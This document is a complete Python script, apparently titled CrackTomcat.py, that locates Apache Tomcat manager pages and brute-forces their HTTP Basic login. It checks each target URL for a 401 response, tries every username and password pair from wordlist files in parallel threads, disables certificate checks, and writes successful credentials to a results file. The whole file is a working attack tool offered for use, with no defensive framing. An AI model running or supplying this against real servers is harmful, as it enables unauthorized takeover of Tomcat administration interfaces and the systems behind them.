#!/usr/bin/python
# -*- coding: utf-8 -*-
# author:Kat
from concurrent.futures import ThreadPoolExecutor, FIRST_EXCEPTION, wait, ALL_COMPLETED

import requests
import base64
import sys
import argparse
import threadpool
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

logo = '''
 _____             __    ______                    __
 / ___/______ _____/ /__ /_  __/__  __ _  _______ _/ /_
/ /__/ __/ _ `/ __/  '_/  / / / _ \/  ' \/ __/ _ `/ __/
\___/_/  \_,_/\__/_/\_\__/_/  \___/_/_/_/\__/\_,_/\__/
                     /___/by_Kat v1.3
'''


def _multithreading(funcname, url, user_txt, pass_txt, pools=5):
    works = []
    with open(user_txt, "r") as f:
        for name in f:
            with open(pass_txt, "r", encoding='ISO-8859-1') as f:
                for password in f:
                    work = []
                    work.append(url)
                    work.append(name.strip("\n"))
                    work.append(password.strip("\n"))
                    works.append(work)

    val = ""

    executor = ThreadPoolExecutor(max_workers=10)
    all_task = [executor.submit(funcname, work) for work in works]

    # 等待第一个任务抛出异常，就阻塞线程池
    wait(all_task, return_when=FIRST_EXCEPTION)
    # 反向序列化之前塞入的任务队列，并逐个取消
    for task in reversed(all_task):
        task.cancel()
    # 等待正在执行任务执行完成
    wait(all_task, return_when=ALL_COMPLETED)


def multithreading(funcname, filename="url.txt", pools=5):
    works = []
    with open(filename, "r") as f:
        for i in f:
            func_params = [i.rstrip("\n")]
            works.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(funcname, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()





def fingerprint_sin(url):
    print("[+] startig tomcat fingerprint check --- ---\n")
    try:
        req = requests.get(url + "/manager/html", timeout=5, verify=False)
        if req.status_code == 401:
            print("\033[32m[+] Tomcat fingerprints found", url, "\033[0m")
            _multithreading(check_tomcat, url, "user.txt", "pass.txt", 8)
        else:
            print("[+] Tomcat background not found！ --- ---\n")
    except Exception as f:
        print("[+] Network exception --- ---\n")


def fingerprint_Mu(url):
    print("[+] startig tomcat fingerprint check --- ---\n")
    try:
        req = requests.get(url + "/manager/html", timeout=5, verify=False)
        if req.status_code == 401:
            print("\033[32m[+] Tomcat fingerprints found", url, "\033[0m")
            try:
                _multithreading(check_tomcat, url, "user.txt", "pass.txt", 8)
            except:
                pass
        else:
            print("[+] Tomcat background not found！ --- ---\n")
    except Exception as f:
        print("[+] Network exception --- ---\n")


def check_tomcat(data):
    i = 0
    _len = len(data)
    i = i + 1
    print("[+] 正在进行第 {}".format(data[0] + ":" + data[1] + ":" + data[2]))
    pass_str = data[1] + ":" + data[2]
    base64_str = base64.b64encode(pass_str.encode('utf-8')).decode("utf-8")
    headers = {
        "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        "Content-Type": "application/x-www-form-urlencoded",
        'Authorization': 'Basic %s' % base64_str
    }
    req = requests.get(data[0] + "/manager/html", headers=headers, timeout=5, verify=False)
    if req.status_code == 200 and "/manager" in req.text:
        print('\033[31m'"[+] status_code:", req.status_code, "tomcat爆破成功:", data[1] + ":" + data[2], '\033[0m')
        with open('result.txt', 'a+') as f:
            f.write(data[0] + '\n')
            f.write(data[1] + ":" + data[2])
            f.write('\n=============\n')
        print("finish")
        raise Exception("finish")


if __name__ == "__main__":
    print(logo)
    if (len(sys.argv)) < 2:
        print('Useage: python3 CrackTomcat.py -u url')
        print('Useage: python3 CrackTomcat.py -r url.txt')
    else:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', help="url -> example http://127.0.0.1", type=str, dest='check_url')
        parser.add_argument('-r', help="url list to file", type=str, dest='check_file')
        args = parser.parse_args()
        if args.check_url:
            fingerprint_sin(args.check_url)
        if (args.check_file):
            multithreading(fingerprint_Mu, args.check_file, 8)
